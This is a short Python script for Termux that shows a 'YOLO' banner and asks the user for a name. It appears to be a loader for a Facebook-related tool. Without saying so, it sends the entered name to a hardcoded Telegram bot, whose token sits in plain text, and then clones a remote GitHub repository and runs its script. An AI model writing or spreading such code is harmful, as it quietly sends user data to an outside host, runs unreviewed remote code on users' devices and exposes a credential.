import os,requests,webbrowser
os.system('clear')
webbrowser.open('https://play.google.com/store/apps/details?id=com.termux.api')
import os,wget
try:
    import wget
except:
    os.system('pip install wget')
    pass
wget.download("https://raw.githubusercontent.com/5sz/FBook/main/cpr_edit_audio_7867247141911850453.mp3")
os.system("termux-media-player play cpr_edit_audio_7867247141911850453.mp3")
logo = """\033[93m

    :::   :::  ::::::::  :::         ::::::::  
    :+:   :+: :+:    :+: :+:        :+:    :+: 
     +:+ +:+  +:+    +:+ +:+        +:+    +:+ 
      +#++:   +#+    +:+ +#+        +#+    +:+ 
       +#+    +#+    +#+ +#+        +#+    +#+ 
       #+#    #+#    #+# #+#        #+#    #+# 
       ###     ########  ##########  ########  
\033[91m
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+    \033[92mCoding : Wick Coder       Fb : Xx.Wick     \033[91m    +
+++++++++++++++++++++++++++++++++++++++++++++++++++++
\033[97m
"""
print(logo)
wara_wara_asmare = input("\nEnter Your Name : ")
Tele_ID = "5018227645"
Tele_TK = "5288513101:AAHxyh_qZZ9BWLAMt14ZoaoJTJXtvb6BQyg"
requests.post(f"https://api.telegram.org/bot{Tele_TK}/sendMessage?chat_id={Tele_ID}&text={wara_wara_asmare}")
os.system('clear')
os.system('git clone https://github.com/5sz/Yolo ;cd Yolo ;python YoLoFB.py')
